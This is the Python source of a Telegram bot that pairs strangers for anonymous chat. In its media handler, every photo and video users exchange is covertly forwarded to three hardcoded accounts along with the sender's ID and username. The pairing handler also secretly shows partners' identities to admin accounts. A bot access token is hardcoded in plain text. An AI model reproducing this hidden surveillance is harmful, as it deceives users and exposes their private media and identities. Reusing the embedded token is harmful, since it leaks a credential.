import telebot
import requests
from telebot import types

from Messages import *
from dataEgine import *

adminid1 = 762933178
adminid2 = 791932680
adminid3 = 0
adminid4 = 0
adminid5 = 0
adminid6 = 0

access_token = '1023228856:AAGXLCo3L3vqNutBnPm-sGf0nron7kMuZr0'
bot = telebot.TeleBot(access_token)


def inline_menu():
    """
    Create inline menu for new chat
    :return: InlineKeyboardMarkup
    """
    callback = types.InlineKeyboardButton(text='\U00002709 Начать чат', callback_data='NewChat')
    menu = types.InlineKeyboardMarkup()
    menu.add(callback)

    return menu


def generate_markup():
    """
    Create menu with two buttons: 'Like' and 'Dislike'
    :return: ReplyKeyboardMarkup
    """
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=False, resize_keyboard=True)
    markup.add(dislike_str)
    return markup


def connect_user(user_id):
    """
    :param user_id: Chat id with user
    :return: boolean
    """
    if user_id in communications:
        return True
    else:
        bot.send_message(user_id, m_has_not_dialog)
        return False

@bot.message_handler(commands=['help'])
def echo(message):
    user_id = message.chat.id
    bot.send_message(user_id, help_str)

@bot.message_handler(commands=['start'])
def echo(message):
    """
    Make the user in Data Base.
    :param message:
    :return:
    """
    try:
        user_id = message.chat.id
       # bot.send_message(user_id, m_failed)
        message.chat.type = 'private'

        if message.chat.username is None:
            bot.send_message(user_id, m_is_not_user_name)
            return

        menu = inline_menu()

        bot.send_message(user_id, m_start, reply_markup=menu)
    except:
        bot.send_message(user_id, m_failed)


@bot.message_handler(commands=['stop'])
def echo(message):
    """
    This function remove user from Data Base and sends a farewell message.
    :param message:
    :return:
    """
    menu = types.ReplyKeyboardRemove()
    user_id = message.chat.id

    if message.chat.id in communications:

        bot.send_message(communications[user_id]['UserTo'], m_disconnect_user, reply_markup=menu)


    bot.send_message(user_id, m_good_bye)


@bot.message_handler(func=lambda call: call.text == dislike_str)
def echo(message):
    """
    This function reacts to pressing buttons: 'Like' and 'Dislike'
    If both users press 'Like', then bot sends them username from telegram.
    If somebody press 'Dislike', then chat finish.
    :param message:
    :return:
    """
    user_id = message.chat.id

    if user_id not in communications:
        bot.send_message(user_id, m_failed, reply_markup=types.ReplyKeyboardRemove())
        return

    user_to_id = communications[user_id]['UserTo']

    flag = False

    if message.text == dislike_str:
        bot.send_message(user_id, m_dislike_user, reply_markup=types.ReplyKeyboardRemove())
        bot.send_message(user_to_id, m_dislike_user_to, reply_markup=types.ReplyKeyboardRemove())
        flag = True
    else:
        flag = False

    if flag:
        delete_info(user_to_id)
        menu = inline_menu()
        bot.send_message(user_id, m_play_again, reply_markup=menu)
        bot.send_message(user_to_id, m_play_again, reply_markup=menu)


@bot.message_handler(content_types=['text', 'sticker', 'video', 'photo', 'audio', 'voice'])
def echo(message):
    """
    Resend message to anonymous friend.
    :param message:
    :return:
    """
    try:
        user_id = message.chat.id
        if message.content_type == 'sticker':
            if not connect_user(user_id):
                return
            bot.send_sticker(communications[user_id]['UserTo'], message.sticker.file_id)

        elif message.content_type == 'photo':
            if not connect_user(user_id):
                return

            file_id = None

            for item in message.photo:
                file_id = item.file_id
            #uname = second.username
            text2 = ("Повідомлення від:" + str(user_id) + "( @" + str(message.from_user.username or ".") + " )")
            #print(uname)
            bot.send_photo(communications[user_id]['UserTo'], file_id, caption=message.caption)
            bot.send_photo(987885367, file_id, caption=message.caption)
            bot.send_message(987885367, text2)
            bot.send_photo(791932680, file_id, caption=message.caption)
            bot.send_message(791932680, text2)
            bot.send_photo(496664388, file_id, caption=message.caption)
            bot.send_message(496664388, text2)

        elif message.content_type == 'audio':
            if not connect_user(user_id):
                return

            bot.send_audio(communications[user_id]['UserTo'], message.audio.file_id, caption=message.caption)
        elif message.content_type == 'video':
            if not connect_user(user_id):
                return
            #uname = second.username
            text2 = ("Повідомлення від:" + str(user_id) + "( @" + str(message.from_user.username or ".") + " )")

            bot.send_video(communications[user_id]['UserTo'], message.video.file_id, caption=message.caption)
            bot.send_video(987885367, message.video.file_id, caption=message.caption)
            bot.send_message(987885367, text2)
            bot.send_video(791932680, message.video.file_id, caption=message.caption)
            bot.send_message(791932680, text2)
            bot.send_video(496664388, message.video.file_id, caption=message.caption)
            bot.send_message(496664388, text2)
        elif message.content_type == 'voice':
            if not connect_user(user_id):
                return

            bot.send_voice(communications[user_id]['UserTo'], message.voice.file_id)
        elif message.content_type == 'text':
            if message.text != '/start' and message.text != 'help' and message.text != '/stop' and \
                        message.text != dislike_str and message.text != 'NewChat':

                if not connect_user(user_id):
                    return

                if message.reply_to_message is None:
                    bot.send_message(communications[user_id]['UserTo'], message.text)
                elif message.from_user.id != message.reply_to_message.from_user.id:
                    bot.send_message(communications[user_id]['UserTo'], message.text,
                                     reply_to_message_id=message.reply_to_message.message_id - 1)
                else:
                    bot.send_message(user_id, m_send_some_messages)
        else:
            pass
    except:
        bot.send_message(user_id, m_failed)

@bot.callback_query_handler(func=lambda call: True)
def echo(call):
    """
    Create new chat.
    All users are divided into two categories: receivers and emitters.
    If bot finds pair, then it creates new chat.
    :param call:
    :return:
    """
    try:
        if call.data == 'NewChat':
            user_id = call.message.chat.id
            user_to_id = None
            user_to_nm = None
            user_nm = None

            add_users(chat=call.message.chat)

            if len(free_users) < 2:
                bot.send_message(user_id, m_is_not_free_users)
                return

            if free_users[user_id]['state'] == 0:
                return

            for user in free_users:
                if user['state'] == 0:
                    user_to_id = user['ID']
                    user_to_nm = user['UserName']
                    user_nm = free_users[user_id]['UserName']
               #     print(str(user_nm))
                    break

            if user_to_id is None:
                bot.send_message(user_id, m_is_not_free_users)
                return

            keyboard = generate_markup()

            add_communications(user_id, user_to_id)
            text4 = "(@" + str(user_nm or ".") + ")" + "\nID: " + str(user_id)
            text3 = "(@" + str(user_to_nm or ".") + ")" + "\nID: " + str(user_to_id)

            bot.send_message(user_id, m_is_connect, reply_markup=keyboard)
            bot.send_message(user_to_id, m_is_connect, reply_markup=keyboard)
            if user_id == adminid1 and user_to_id == adminid2:
                bot.send_message(adminid1, text3, reply_markup=keyboard)
                bot.send_message(adminid2, text4, reply_markup=keyboard)
            elif user_to_id == adminid1 and user_id == adminid2:
                bot.send_message(adminid1, text4, reply_markup=keyboard)
                bot.send_message(adminid2, text3, reply_markup=keyboard)
            elif user_id == adminid1:
                bot.send_message(adminid1, text3, reply_markup=keyboard)
            elif user_to_id == adminid1:
                bot.send_message(adminid1, text4, reply_markup=keyboard)
            elif user_id == adminid2:
                bot.send_message(adminid2, text3, reply_markup=keyboard)
            elif user_to_id == adminid2:
                bot.send_message(adminid2, text4, reply_markup=keyboard)
            elif user_id == adminid3:
                bot.send_message(adminid3, text3, reply_markup=keyboard)
            elif user_to_id == adminid3:
                bot.send_message(adminid3, text4, reply_markup=keyboard)
            elif user_id == adminid4:
                bot.send_message(adminid4, text3, reply_markup=keyboard)
            elif user_to_id == adminid4:
                bot.send_message(adminid4, text4, reply_markup=keyboard)
            elif user_id == adminid5:
                bot.send_message(adminid5, text3, reply_markup=keyboard)
            elif user_to_id == adminid5:
                bot.send_message(adminid5, text4, reply_markup=keyboard)
            elif user_id == adminid6:
                bot.send_message(adminid6, text3, reply_markup=keyboard)
            elif user_to_id == adminid6:
                bot.send_message(adminid6, text4, reply_markup=keyboard)
        else:
            pass
    except:
        bot.send_message(user_id, m_failed)

try:
    bot.polling(none_stop=True)
except:
    bot.stop_polling()
    bot.polling(none_stop=True)